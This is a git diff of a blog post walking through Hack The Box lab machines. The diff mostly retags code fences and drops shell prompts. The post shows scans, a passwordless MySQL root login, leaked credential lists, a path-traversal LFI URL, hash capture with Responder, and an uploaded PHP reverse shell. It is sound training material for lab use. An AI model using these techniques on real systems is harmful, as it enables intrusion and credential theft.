@@ -15,7 +15,7 @@ cover:
 
 ## Appointment
 ### nmap
-```
+```sh
 # Nmap 7.92 scan initiated Tue Oct 25 20:48:19 2022 as: nmap -sC -sV -oA nmap/appointment 10.129.17.225
 Nmap scan report for 10.129.17.225
 Host is up (0.11s latency).
@@ -42,7 +42,7 @@ Perhaps this isn't the point of entry, let's try to find any useful subdirectori
 `gobuster` (`sudo apt install gobuster`) is a tool that bruteforces urls in order to find subdomains, subdirectories, and files. Let's run a simple scan on this IP and store the output in `gobuster.out` for later reference.
 
 ```shell {linenos=false}
-$ gobuster dir -u http://10.129.17.225 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster.out -z
+gobuster dir -u http://10.129.17.225 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster.out -z
 ```
 
 *(note: `sudo apt install seclists` if you do not already have this directory)*
@@ -104,7 +104,7 @@ As you can see, it takes a bit of trial and error, hence how automation (through
 ## Sequel
 
 ### nmap
-```
+```sh
 # Nmap 7.92 scan initiated Tue Oct 25 22:42:52 2022 as: nmap -sC -sV -oA nmap/sequel 10.129.152.89
 Nmap scan report for 10.129.152.89
 Host is up (0.077s latency).
@@ -119,7 +119,7 @@ PORT     STATE SERVICE VERSION
 |   Capabilities flags: 63486
 |   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsTransactions, ConnectWithDatabase, IgnoreSigpipes, ODBCClient, FoundRows, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
 |   Status: Autocommit
-|   Salt: fxIBQOv&Xj->/n`tHL"c
+|   Salt: fxIBQOv&Xj->/n`tHL"c"
 |_  Auth Plugin Name: mysql_native_password
 |_ssl-cert: ERROR: Script execution failed (use -d to debug)
 |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
@@ -136,7 +136,7 @@ Since `port 3306` is open, lets take a look into connecting to `mysql` (`sudo ap
 We can run the following command and try for root right away:
 
 ```shell {linenos=false}
-$ mysql -h 10.129.152.89 -u root
+mysql -h 10.129.152.89 -u root
 ```
 
 *command tags:*
@@ -149,7 +149,7 @@ Bingo!
 
 Now we can just run a few sql commands and profit:
 
-```shell {linenos=false}
+```powershell {linenos=false}
 > show databases
 ...
 > use htb;
@@ -184,7 +184,7 @@ Now we can just run a few sql commands and profit:
 ## Crocodile
 
 ### nmap 
-```
+```sh
 # Nmap 7.92 scan initiated Tue Oct 25 23:11:51 2022 as: nmap -sC -sV -oA nmap/crocodile 10.129.228.114
 Nmap scan report for 10.129.228.114
 Host is up (0.080s latency).
@@ -222,7 +222,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ![ftp](/img/tier1/ftp.png)
 
 *file: allowed.userlist:*
-```
+```txt
 aron
 pwnmeow
 egotisticalsw
@@ -230,7 +230,7 @@ admin
 ```
 
 *file: allowed.userlist.password:*
-```
+```txt
 root
 Supersecretpassword1
 @BaASD&9032123sADS
@@ -310,7 +310,7 @@ Going for the throat with the `admin:rKXM59ESxesUFHAd` grants us access and the 
 
 ### nmap
 For this scan, I added the tags `-p-` to scan all ports since the top 1000 had no hits and `-T5`for the `insane` level to increase speed.
-```
+```sh
 # Nmap 7.92 scan initiated Tue Oct 25 23:51:23 2022 as: nmap -p- -sC -sV -T5 -oA nmap/responder 10.129.245.210
 Nmap scan report for 10.129.245.210
 Host is up (0.21s latency).
@@ -336,7 +336,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Looks like the IP is getting redirected to `unika.htb`. Let's add this to `/etc/hosts` to map the hostname to the IP address to help `DNS`.
 
 *file: /etc/hosts*
-```
+```txt
 127.0.0.1       localhost
 127.0.1.1       kali
 10.129.245.210  unika.htb
@@ -353,7 +353,7 @@ After clicking around, something stood out after changing the language to French
 
 `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`
 &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;:arrow_down::arrow_down::arrow_down:
-``` {linenos=false}
+```txt {linenos=false}
 # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft 
 TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # 
 entry should be kept on an individual line. The IP address should # be placed in the first
@@ -373,7 +373,7 @@ Now that we know we can access files on the server, an `LFI` (Local File Incluse
 `Responder` (`git clone https://github.com/lgandx/Responder`), is a tool that can simulate many attacks. In this case, we will use it as a malicious SMB server to capture the `NetNTLMv2` hash. This can be done by:
 
 ```shell {linenos=false}
-$ sudo python3 Responder.py -I tun0
+sudo python3 Responder.py -I tun0
 ```
 
 Now we will have the server interact with this SMB server (hosted on your client IP — mine being `10.10.14.165`) by changing the URL in our browser to:
@@ -451,7 +451,7 @@ Box popped.
 
 ## Three
 ### nmap
-```
+```sh
 # Nmap 7.92 scan initiated Thu Oct 27 13:35:55 2022 as: nmap -sC -sV -oA nmap/three -T4 10.129.37.145
 Nmap scan report for 10.129.37.145
 Host is up (0.072s latency).
@@ -486,7 +486,7 @@ This section caused problems for me.
 First, I looked for subdirectories:
 
 ```shell {linenos=false}
-$ gobuster dir -u http://10.129.37.145 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+gobuster dir -u http://10.129.37.145 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 ```
 
 This proved unhelpful with only the `/images` directory found.
@@ -496,17 +496,17 @@ This proved unhelpful with only the `/images` directory found.
 I then tried running `gobuster` to look for subdomains hosted on the same IP using the `vhost` feature.
 
 ```shell {linenos=false}
-$ gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z
+gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z
 ```
 
 I tested several of the number outputs by adding them to `/etc/hosts`, but none of them worked. I then updated the `wordlist` to remove all of these inputs that contain numbers through a simple python script. 
 
 ```shell {linenos=false}
-$ sudo gobuster vhost -u http://thetoppers.htb -w subdomain_wl_no_numbers.txt -z -o gobuster.out
+sudo gobuster vhost -u http://thetoppers.htb -w subdomain_wl_no_numbers.txt -z -o gobuster.out
 ```
 
 This only found the following subdomain (which failed after testing)
-```{linenos=false}
+```txt {linenos=false}
 Found: gc._msdcs Status: 400 [Size: 306]
 ```
 
@@ -514,7 +514,7 @@ Found: gc._msdcs Status: 400 [Size: 306]
 Next, I tried switching to `ffuf` as `gobuster` seemed to be failing me. 
 
 ```shell {linenos=false}
-$ ffuf -c -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.thetopper.htb" -fc 200
+ffuf -c -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.thetopper.htb" -fc 200
 ```
 
 Still, no luck. 
@@ -531,25 +531,25 @@ NOW, moving on...
 The `Amazon S3 bucket` (or `s3` for short) is a cloud-based storage service which contains `s3` objects. We can use the `awscli` (`sudo apt install awscli`) to try to interact with this bucket.
 
 ```shell {linenos=false}
-$ aws configure
+aws configure
 ```
 ![config](/img/tier1/config.png)
 
 Then we can look at all the `s3` buckets:
 
 ```shell {linenos=false}
-$ aws --endpoint=http://s3.thetoppers.htb s3 ls
+aws --endpoint=http://s3.thetoppers.htb s3 ls
 ```
 
 and all the objects in a bucket:
 ```shell {linenos=false}
-$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 ```
 
 There seems nothing of particular value in the bucket, but we can try and add a malicious `php` file and get a `reverse shell`. I typically take [pentestmonkey's](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) template and change the `$ip` and `port` accordingly. To upload:
 
 ```shell {linenos=false}
-$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ```
 
 We are in.
